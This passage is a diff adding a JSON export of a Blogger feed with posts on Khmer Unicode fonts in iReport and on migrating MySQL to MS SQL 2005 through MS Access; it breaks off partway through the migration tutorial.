@@ -1,0 +1,2830 @@
+{
+  "version": "1.0",
+  "encoding": "UTF-8",
+  "feed": {
+    "xmlns": "http://www.w3.org/2005/Atom",
+    "xmlns$openSearch": "http://a9.com/-/spec/opensearchrss/1.0/",
+    "xmlns$blogger": "http://schemas.google.com/blogger/2008",
+    "xmlns$georss": "http://www.georss.org/georss",
+    "xmlns$gd": "http://schemas.google.com/g/2005",
+    "xmlns$thr": "http://purl.org/syndication/thread/1.0",
+    "id": {
+      "$t": "tag:blogger.com,1999:blog-604585202851795693"
+    },
+    "updated": {
+      "$t": "2026-07-23T23:05:41.064-07:00"
+    },
+    "category": [
+      {
+        "term": "Java"
+      },
+      {
+        "term": "Khmer Unicode"
+      },
+      {
+        "term": "PHP"
+      },
+      {
+        "term": "Eclipse"
+      },
+      {
+        "term": "CodeIgniter"
+      },
+      {
+        "term": "Flex"
+      },
+      {
+        "term": "Fonts"
+      },
+      {
+        "term": "J2EE"
+      },
+      {
+        "term": "MS DotNet"
+      },
+      {
+        "term": "VS 2005"
+      },
+      {
+        "term": "VS 2008"
+      },
+      {
+        "term": "Virus"
+      },
+      {
+        "term": "Visual Studio"
+      },
+      {
+        "term": "Accounting"
+      },
+      {
+        "term": "Adobe CS3"
+      },
+      {
+        "term": "Antivirus"
+      },
+      {
+        "term": "Bing"
+      },
+      {
+        "term": "Browser"
+      },
+      {
+        "term": "C#"
+      },
+      {
+        "term": "C/C++"
+      },
+      {
+        "term": "Chuon Nat"
+      },
+      {
+        "term": "Crystal Report"
+      },
+      {
+        "term": "Database"
+      },
+      {
+        "term": "Design"
+      },
+      {
+        "term": "Dictionary"
+      },
+      {
+        "term": "Digester"
+      },
+      {
+        "term": "Django"
+      },
+      {
+        "term": "Encoding"
+      },
+      {
+        "term": "Errors"
+      },
+      {
+        "term": "Firefox"
+      },
+      {
+        "term": "General"
+      },
+      {
+        "term": "Hack"
+      },
+      {
+        "term": "Hosting"
+      },
+      {
+        "term": "How to kill Virus"
+      },
+      {
+        "term": "Jboss"
+      },
+      {
+        "term": "Jibx"
+      },
+      {
+        "term": "Khmer Dictionary"
+      },
+      {
+        "term": "Log Management"
+      },
+      {
+        "term": "MS Access"
+      },
+      {
+        "term": "MS Office"
+      },
+      {
+        "term": "MS Office 2007"
+      },
+      {
+        "term": "MS SQL"
+      },
+      {
+        "term": "Mathamatics"
+      },
+      {
+        "term": "Maven"
+      },
+      {
+        "term": "Maven 2"
+      },
+      {
+        "term": "Microsoft"
+      },
+      {
+        "term": "Migration"
+      },
+      {
+        "term": "MySQL"
+      },
+      {
+        "term": "News"
+      },
+      {
+        "term": "Oracle"
+      },
+      {
+        "term": "PDF"
+      },
+      {
+        "term": "PLSQL"
+      },
+      {
+        "term": "POM"
+      },
+      {
+        "term": "Performance"
+      },
+      {
+        "term": "Plug-In"
+      },
+      {
+        "term": "Presentation"
+      },
+      {
+        "term": "Problam And Solution"
+      },
+      {
+        "term": "Programming"
+      },
+      {
+        "term": "Python"
+      },
+      {
+        "term": "RandomAccessFile"
+      },
+      {
+        "term": "Ruby"
+      },
+      {
+        "term": "Ruby on Rails"
+      },
+      {
+        "term": "SQL Server"
+      },
+      {
+        "term": "SQLPlus"
+      },
+      {
+        "term": "Search Engine"
+      },
+      {
+        "term": "Security"
+      },
+      {
+        "term": "Tips"
+      },
+      {
+        "term": "WordPress"
+      },
+      {
+        "term": "Write to file"
+      },
+      {
+        "term": "XML"
+      },
+      {
+        "term": "XPS"
+      },
+      {
+        "term": "barcamppp"
+      },
+      {
+        "term": "iReport"
+      }
+    ],
+    "title": {
+      "type": "text",
+      "$t": "Computer Experience"
+    },
+    "subtitle": {
+      "type": "html",
+      "$t": "Currently I no longer maintenance this blog so please go to http://osify.com/"
+    },
+    "link": [
+      {
+        "rel": "http://schemas.google.com/g/2005#feed",
+        "type": "application/atom+xml",
+        "href": "https://computer-experience.blogspot.com/feeds/posts/default"
+      },
+      {
+        "rel": "self",
+        "type": "application/atom+xml",
+        "href": "https://www.blogger.com/feeds/604585202851795693/posts/default?alt=json&max-results=500"
+      },
+      {
+        "rel": "alternate",
+        "type": "text/html",
+        "href": "https://computer-experience.blogspot.com/"
+      },
+      {
+        "rel": "hub",
+        "href": "http://pubsubhubbub.appspot.com/"
+      }
+    ],
+    "author": [
+      {
+        "name": {
+          "$t": "Unknown"
+        },
+        "email": {
+          "$t": "noreply@blogger.com"
+        },
+        "gd$image": {
+          "rel": "http://schemas.google.com/g/2005#thumbnail",
+          "width": "16",
+          "height": "16",
+          "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+        }
+      }
+    ],
+    "generator": {
+      "version": "7.00",
+      "uri": "http://www.blogger.com",
+      "$t": "Blogger"
+    },
+    "openSearch$totalResults": {
+      "$t": "29"
+    },
+    "openSearch$startIndex": {
+      "$t": "1"
+    },
+    "openSearch$itemsPerPage": {
+      "$t": "500"
+    },
+    "entry": [
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-623484468825198439"
+        },
+        "published": {
+          "$t": "2010-04-08T00:45:00.000-07:00"
+        },
+        "updated": {
+          "$t": "2010-04-08T03:39:39.608-07:00"
+        },
+        "title": {
+          "type": "text",
+          "$t": "TEMPORARY NO MORE MAITENANCE ON THIS BLOG"
+        },
+        "content": {
+          "type": "html",
+          "$t": "Hi,<br />As now I can't manage the post for many blogs so I stop write for this blog and export all these posts to my personal website: <a href=\"http://osify.com\">http://osify.com</a><br /><br />Unless I have no money to pay for the hosting and domain, otherwise I will not come back, please visit at <a href=\"http://osify.com\">http://osify.com</a> as well."
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/623484468825198439/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2010/04/temporary-no-more-maitenance-on-this.html#comment-form",
+            "title": "1 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/623484468825198439"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/623484468825198439"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2010/04/temporary-no-more-maitenance-on-this.html",
+            "title": "TEMPORARY NO MORE MAITENANCE ON THIS BLOG"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "thr$total": {
+          "$t": "1"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-5924433995334033749"
+        },
+        "published": {
+          "$t": "2010-02-28T18:30:00.000-08:00"
+        },
+        "updated": {
+          "$t": "2010-02-28T20:48:21.140-08:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "iReport"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Java"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Khmer Unicode"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "Khmer Unicode with Ireport 3.7.1 works fine with Kh fonts"
+        },
+        "content": {
+          "type": "html",
+          "$t": "Just quick configuration with Ireport 3.7.1 without detail here:<br /><ol><li>Download ireport from <a href=\"http://jasperforge.org//website/ireportwebsite/IR%20Website/ir_download.html?header=project&amp;target=ireport\">http://jasperforge.org</a> 3.7.1</li><li>Install ireport 3.7.1</li><li>Open ireport design</li><li>Use blank design</li><li>Go to ireport tool configuration: <span style=\"font-weight: bold;\">Tool --> Options --> Fonts</span> and click install fonts</li></ol>I install two fonts: Khmer OS System and Kh System<br /><br />First tested with Khmer OS System font, found it's not display correctly, see screen shot:<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjRrpHUrecj17Whk9-9acME0pVmuBovqLva-4rcHU9FxToCZQFHWQ7czygM6DMOLdWOuyf2zSFRVybLU-AM-AP29kjejfIOwiY9imCWxoiIUhnPBGCyUnksBLVN5SIvkKIlulA3OLMkGHsI/s1600-h/ireport-khmerossystem-font.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 219px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjRrpHUrecj17Whk9-9acME0pVmuBovqLva-4rcHU9FxToCZQFHWQ7czygM6DMOLdWOuyf2zSFRVybLU-AM-AP29kjejfIOwiY9imCWxoiIUhnPBGCyUnksBLVN5SIvkKIlulA3OLMkGHsI/s400/ireport-khmerossystem-font.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5443519258450506210\" border=\"0\" /></a><br />Now I use font: Kh System, it displays correctly:<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisKvpnfm-9DkTfE97MDZqfp3ndKuFF9L0DUpYyah3ttyjbVB6kpjVXnqfRYSJPwaL5hZ8-g_AdfygQpQ2HWpDnrqcMOSPHaAQiu6w1bckebVKNMc576eB_PLwFDRAgxoNTb1nXoghtCjkK/s1600-h/ireport-khsystem-font.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 256px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisKvpnfm-9DkTfE97MDZqfp3ndKuFF9L0DUpYyah3ttyjbVB6kpjVXnqfRYSJPwaL5hZ8-g_AdfygQpQ2HWpDnrqcMOSPHaAQiu6w1bckebVKNMc576eB_PLwFDRAgxoNTb1nXoghtCjkK/s400/ireport-khsystem-font.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5443519719068859458\" border=\"0\" /></a>Printed the report into PDF format also work for me.<br /><br />To configure, I just change the font name to JasperReports Properties (find in Options menu):<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgA26T7cbiAYffvlanHcJpSqBV_bRVNersnpjN-NJ0Z5kMZFkhtIxOH011LTzobIZ46ws5S4IuBAm_fnEbWfQD0_OCsFz1hHqFuM_6TJMUAV5jIJLWwqmokC1_3sI0fHtVYyezr8lwQ6VN_/s1600-h/ireport-font-properties.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 338px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgA26T7cbiAYffvlanHcJpSqBV_bRVNersnpjN-NJ0Z5kMZFkhtIxOH011LTzobIZ46ws5S4IuBAm_fnEbWfQD0_OCsFz1hHqFuM_6TJMUAV5jIJLWwqmokC1_3sI0fHtVYyezr8lwQ6VN_/s400/ireport-font-properties.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5443520360619806674\" border=\"0\" /></a><br />In my local PC, I have already installed the font (Kh System) so please consider to add also if above configuration not yet work for you.<br /><br />As I'm not using iReport, just wanna to test with Khmer Unicode only.<br /><br />Thanks for comment any idea to improve it.<br /><br /><a href=\"http://www.snapdrive.net/files/583222/training/ireportKhmerUnicode.zip\">Tested Package download here</a>."
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/5924433995334033749/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2010/02/khmer-unicode-with-ireport-371-works.html#comment-form",
+            "title": "1 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/5924433995334033749"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/5924433995334033749"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2010/02/khmer-unicode-with-ireport-371-works.html",
+            "title": "Khmer Unicode with Ireport 3.7.1 works fine with Kh fonts"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "media$thumbnail": {
+          "xmlns$media": "http://search.yahoo.com/mrss/",
+          "url": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjRrpHUrecj17Whk9-9acME0pVmuBovqLva-4rcHU9FxToCZQFHWQ7czygM6DMOLdWOuyf2zSFRVybLU-AM-AP29kjejfIOwiY9imCWxoiIUhnPBGCyUnksBLVN5SIvkKIlulA3OLMkGHsI/s72-c/ireport-khmerossystem-font.JPG",
+          "height": "72",
+          "width": "72"
+        },
+        "thr$total": {
+          "$t": "1"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-3497898768169177566"
+        },
+        "published": {
+          "$t": "2010-02-21T21:54:00.000-08:00"
+        },
+        "updated": {
+          "$t": "2010-02-22T01:54:10.792-08:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Migration"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "MS Access"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "MS SQL"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "MySQL"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "Migrate from MySQL to MS SQL 2005 using MS Access 2003 as a bridge"
+        },
+        "content": {
+          "type": "html",
+          "$t": "<a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfFwni66i7hAZiAfVCE9123mtHv_zkh7Vo8XoO9T7Yte0j_s1Q2Ffr0qhM0jipamS2w0BPYk23rquE_KmCWWep6OnGOsfG31XfaZxqWHuQvAavap-R9Qr4vNxQ9aiyp4YEgJ340r4lEIr6/s1600-h/migrate_mysql_mssql2k5_mssql-18.JPG\"></a>My friend asked me this topic \"Migrate all tables of MySQL to MS SQL 2005 - what way\".<br />I searched on the net as usual, got many questions and answer around one table import mostly but for many tables seem got a tip from a comment:<br /><br /><blockquote>This might not be the best solution.  Nonetheless, it worked for me.   First you need to install and configurate the MyODBC connector as others  said previously.  Use Access to import from a external ODBC data  source.  (google it if you have trouble with this step).  Once the  import is done, use SSIS to import the data in the Access db into a SQL  Server 2k5 db.  Hope this Helps. (from <a href=\"http://social.msdn.microsoft.com/Forums/en-US/sqlintegrationservices/thread/abb4d339-e0d0-42b8-a56f-bbe91cf4867d\">social.msdb.microsoft.com</a>)<br /></blockquote><br /><span style=\"font-weight: bold;\">CONTENT:</span><br /><ol><li>Technical Environment</li><li>Create ODBC Connection for MySQL</li><li>Import data from ODBC of MySQL to Access Db</li><li>Using SSIS (SQL Server Integration Service) to import data from Access Db to MS SQL<br /></li></ol><br />So here is my transforming steps:<br /><span style=\"font-weight: bold;\">0. Technical Environment</span><br /><ul><li>I'm using Windows XP SP3 (not mandatory, just my environment.)</li><li>MySQL ODBC Connector 5.1.6</li><li>MS Access 2003 or 2007 (I'm using Access 2007 but db with Access 2003)</li><li>MS SQL Server 2005</li><li>MS SQL Server Tool 2005</li></ul><br /><span style=\"font-weight: bold;\">I. Create ODBC Connection to MySQL database</span> (using MySQL ODBC Connecter / System DNS)<br /><ul><li>Download and install MySQL ODBC Connector <a href=\"http://dev.mysql.com/downloads/connector/odbc/\">here</a></li><li>Create System DNS by go to Start --> Settings --> Control Panel --> Administrator Tool --> Click on Data Source (ODBC)</li></ul><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhU86Q3YuQgA6B65F4QRKnQ12sJPZt5VcpX6Xf3QQ7aEtC5JNG4XuFxDGIzGJQHI-bKV_bsCtC9DC-k0pEBja_EA4dM761AM_PnsbMgjmsaMR561VhkEYtZb-Mi16Q-FTSPRkpIYTq7rzH0/s1600-h/migrate_mysql_mssql2k5_1.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 320px; height: 130px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhU86Q3YuQgA6B65F4QRKnQ12sJPZt5VcpX6Xf3QQ7aEtC5JNG4XuFxDGIzGJQHI-bKV_bsCtC9DC-k0pEBja_EA4dM761AM_PnsbMgjmsaMR561VhkEYtZb-Mi16Q-FTSPRkpIYTq7rzH0/s320/migrate_mysql_mssql2k5_1.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440947624503844866\" border=\"0\" /></a><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqhHXdQzV-R7SvrlDR2ZIZ4YAHEZGcqWOm4w2JvCmVoQtu1jEJwcTbHtkUrK4GLVlFh5GugyN2xFwD6ETtVuQPk_HLb1TTn6MkB2UB6fMeeYDxIwXwDlTH-68qVnxww2AZ-7vxUn0Qn_pv/s1600-h/migrate_mysql_mssql2k5_dns_2.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 295px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqhHXdQzV-R7SvrlDR2ZIZ4YAHEZGcqWOm4w2JvCmVoQtu1jEJwcTbHtkUrK4GLVlFh5GugyN2xFwD6ETtVuQPk_HLb1TTn6MkB2UB6fMeeYDxIwXwDlTH-68qVnxww2AZ-7vxUn0Qn_pv/s400/migrate_mysql_mssql2k5_dns_2.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440947917076168306\" border=\"0\" /></a><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjUg8kkK2wbt2Nfablw92n2CPOHa2zMcXjBUNsZ8ZHlcuGo2hoBKvFYd5NTOXiYhiBzk2uS224H___I0VjPUDdRK7cW5wiiatUnP5awm0wTwLIofojQ9Kag5iUyQrobromulXDN3Dwe414P/s1600-h/migrate_mysql_mssql2k5_dns_3.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 379px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjUg8kkK2wbt2Nfablw92n2CPOHa2zMcXjBUNsZ8ZHlcuGo2hoBKvFYd5NTOXiYhiBzk2uS224H___I0VjPUDdRK7cW5wiiatUnP5awm0wTwLIofojQ9Kag5iUyQrobromulXDN3Dwe414P/s400/migrate_mysql_mssql2k5_dns_3.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440947841147627106\" border=\"0\" /></a><br /><span style=\"font-weight: bold;\">II. Using MS Access to import data from an external ODBC data source</span><br />I'm using MS Access 2007 but I use Access 2003 as the version here as mostly would work for all as well.<br /><br /><span style=\"font-weight: bold;\">Step 1</span>: Create a blank Access Db (Using compatible MS Access 2003)<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqCS9vUv5D64NQKvOUXtLlPM1pGiNNNhTubuUzy1rAI_Lt0cNgYMMyRSuVhlGLMFlflLn9wh_-oRGFOHaVbYdnQKz-NphYPkxAvqZJ4EXhAcOJ9MinTfByn5KqGgIPcHgdAmFBQNJoNTOL/s1600-h/migrate_mysql_mssql2k5_access_4.JPG\"></a><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqCS9vUv5D64NQKvOUXtLlPM1pGiNNNhTubuUzy1rAI_Lt0cNgYMMyRSuVhlGLMFlflLn9wh_-oRGFOHaVbYdnQKz-NphYPkxAvqZJ4EXhAcOJ9MinTfByn5KqGgIPcHgdAmFBQNJoNTOL/s1600-h/migrate_mysql_mssql2k5_access_4.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 250px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqCS9vUv5D64NQKvOUXtLlPM1pGiNNNhTubuUzy1rAI_Lt0cNgYMMyRSuVhlGLMFlflLn9wh_-oRGFOHaVbYdnQKz-NphYPkxAvqZJ4EXhAcOJ9MinTfByn5KqGgIPcHgdAmFBQNJoNTOL/s400/migrate_mysql_mssql2k5_access_4.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440948678714537058\" border=\"0\" /></a><br /><span style=\"font-weight: bold;\">Step 2:</span> Go to tab External Data, using import or link to an ODBC Database:<br /><a style=\"font-weight: bold;\" onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiY3_l2iOjmZvA4yOKJ7osFyBp0yYUO_Oa41wTQUGPKhhW75yvth_3yWmx9rjZyOxx9yByAPP0Mq0FEJW_y3SXbjwGAKR9w_BLFMAdkC0Vcdrl_Qo0UzuBCTC5ktofPfOZeLU02YmeL88nK/s1600-h/migrate_mysql_mssql2k5_access_5.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 329px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiY3_l2iOjmZvA4yOKJ7osFyBp0yYUO_Oa41wTQUGPKhhW75yvth_3yWmx9rjZyOxx9yByAPP0Mq0FEJW_y3SXbjwGAKR9w_BLFMAdkC0Vcdrl_Qo0UzuBCTC5ktofPfOZeLU02YmeL88nK/s400/migrate_mysql_mssql2k5_access_5.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440948607459943794\" border=\"0\" /></a><span style=\"font-weight: bold;\">Step 3: </span>Using Import the source data into a new table in the current database option<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0rTUipGlbju8G2aQA1gBZP52gB9jPPHLvHqR1lNycRJjLSd1NrqLNHsL7v5KbMRmjNOSzP0TRDdwEQs1jixRk2lfT5NcKhpzuA3N4-7n3t9xHXkPYMMYtZQTbV8ZPjmVnB1846gZByMEp/s1600-h/migrate_mysql_mssql2k5_access_6.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 293px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0rTUipGlbju8G2aQA1gBZP52gB9jPPHLvHqR1lNycRJjLSd1NrqLNHsL7v5KbMRmjNOSzP0TRDdwEQs1jixRk2lfT5NcKhpzuA3N4-7n3t9xHXkPYMMYtZQTbV8ZPjmVnB1846gZByMEp/s400/migrate_mysql_mssql2k5_access_6.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440948404568475602\" border=\"0\" /></a><br /><span style=\"font-weight: bold;\">Step 4:</span> Go to tab: Machine Data Source, choose MySQL<br /><div style=\"text-align: center;\"><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEis2e-T8qztgsPMObvJVk0FhcZZ1HsW2ZrR-dILwQA2ZfRULTzha8BymooMUsJDcpxj4jKOKtDOS_6Z2ynIb9_PabsFY0Mgt_VC15Oqiv5BI1s_FZgnP9VDqGTpTjDENrpwLd7rpMVvy5k6/s1600-h/migrate_mysql_mssql2k5_access_7-mysql.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 346px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEis2e-T8qztgsPMObvJVk0FhcZZ1HsW2ZrR-dILwQA2ZfRULTzha8BymooMUsJDcpxj4jKOKtDOS_6Z2ynIb9_PabsFY0Mgt_VC15Oqiv5BI1s_FZgnP9VDqGTpTjDENrpwLd7rpMVvy5k6/s400/migrate_mysql_mssql2k5_access_7-mysql.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440948337115396274\" border=\"0\" /></a><br />\"Choose your MySQL database to import\"<br /></div><br /><span style=\"font-weight: bold;\">Step 5:</span> You will see a windows to list all table object, select all and click Ok<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIRzKJ2j8RIajlXbi_0bSLHy5uGkBIUQffhUPuGzyDI0zQ3y8JHAKVqO8QO1oFwpMtsfguA2p4WpIgMmRlcZIRcZWa0BBCmJMFz_BDpyGk9mVQ-fB8BXCl4Q22G4f6pWyAEfjmEWR0vD2F/s1600-h/migrate_mysql_mssql2k5_access_8-select-all.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 382px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIRzKJ2j8RIajlXbi_0bSLHy5uGkBIUQffhUPuGzyDI0zQ3y8JHAKVqO8QO1oFwpMtsfguA2p4WpIgMmRlcZIRcZWa0BBCmJMFz_BDpyGk9mVQ-fB8BXCl4Q22G4f6pWyAEfjmEWR0vD2F/s400/migrate_mysql_mssql2k5_access_8-select-all.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440948275172186322\" border=\"0\" /></a><br /><span style=\"font-weight: bold;\">Step 6:</span> You've done, now. Close button is welcome.<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi7fhhE_y-j4T4Jc-ateTrPyOIFauXfaVvBXj_b_ERlbDwKbL7Ri3ptr9mNX1fhV7vLTx6cFxcX6-DbgpL2PKs9UT9p1IbJa7iKRGRyTQpQJJ-Hv7dX8mUMJ42KOe47qsuh9jlC0Jy3-yu_/s1600-h/migrate_mysql_mssql2k5_access_9-select-all.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 293px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi7fhhE_y-j4T4Jc-ateTrPyOIFauXfaVvBXj_b_ERlbDwKbL7Ri3ptr9mNX1fhV7vLTx6cFxcX6-DbgpL2PKs9UT9p1IbJa7iKRGRyTQpQJJ-Hv7dX8mUMJ42KOe47qsuh9jlC0Jy3-yu_/s400/migrate_mysql_mssql2k5_access_9-select-all.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440948215346496978\" border=\"0\" /></a><br /><br /><span style=\"font-weight: bold;\">III. Using SSIS (SQL Server Integration Service)</span><br />As said above, I'm using MS SQL 2005 Tool (SQL Server Management Studio)<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUxc8WrdjvkmtRoVY6eygX1XdpTcUwes5I72Lp5yS4m6LwSeRGOI4R0YaXYhn0NMCejk7vhARSRrPgnFJGQOrvl-zS6ZWCmnG8Bv6PUNOIusIwmkIOIhAj68S90Z-vuS7D757NC0qdWf4n/s1600-h/migrate_mysql_mssql2k5_mssql-10.JPG\"></a><br /><span style=\"font-weight: bold;\">Step 1:</span> start SQL Server Management Studio<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUxc8WrdjvkmtRoVY6eygX1XdpTcUwes5I72Lp5yS4m6LwSeRGOI4R0YaXYhn0NMCejk7vhARSRrPgnFJGQOrvl-zS6ZWCmnG8Bv6PUNOIusIwmkIOIhAj68S90Z-vuS7D757NC0qdWf4n/s1600-h/migrate_mysql_mssql2k5_mssql-10.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 108px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUxc8WrdjvkmtRoVY6eygX1XdpTcUwes5I72Lp5yS4m6LwSeRGOI4R0YaXYhn0NMCejk7vhARSRrPgnFJGQOrvl-zS6ZWCmnG8Bv6PUNOIusIwmkIOIhAj68S90Z-vuS7D757NC0qdWf4n/s400/migrate_mysql_mssql2k5_mssql-10.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440996878574255682\" border=\"0\" /></a><br /><span style=\"font-weight: bold;\">Step 2:</span> Connect to the server with your authentication<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" 